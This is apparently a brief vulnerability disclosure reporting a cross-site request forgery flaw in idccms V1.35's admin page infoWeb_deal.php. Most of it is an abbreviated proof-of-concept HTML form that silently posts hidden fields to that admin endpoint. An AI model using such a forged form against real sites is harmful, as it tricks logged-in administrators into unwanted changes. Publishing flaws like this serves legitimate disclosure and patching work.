...
idccms V1.35 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/infoWeb_deal.php?mudi=rev
...
<html>
  ...
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:80/admin/infoWeb_deal.php?mudi=rev" method="POST">
      <input type="hidden" name="backURL" value="http%3A%2F%2F127.0.0.1%2Fadmin%2FinfoWeb.php%3Fmudi%3DdynWeb%26dataMode%3D%26dataModeStr%3D%26dataType%3DnewsWeb%26dataTypeCN%3D%25E5%258D%2595%25E7%25AF%2587%25E9%25A1%25B5%26dataType2%3D%26dataID%3D0%26menuID%3D397" />
			...
			<input type="hidden" name="dataID" value="40" />
			...
			<input type="hidden" name="x" value="54" />
